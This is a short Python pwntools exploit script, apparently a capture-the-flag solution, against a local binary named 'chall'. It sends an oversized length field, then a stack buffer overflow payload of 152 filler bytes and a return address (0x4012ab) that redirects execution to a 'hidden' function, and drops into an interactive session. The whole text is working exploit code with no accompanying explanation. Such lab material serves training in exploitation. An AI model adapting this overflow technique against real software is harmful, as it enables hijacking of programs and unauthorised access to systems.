
from pwn import *

p = process("./chall")

hidden = 0x4012ab

payload = b"A"*152
payload += p64(hidden)

p.send(p16(0xffff))
p.send(payload)

p.interactive()
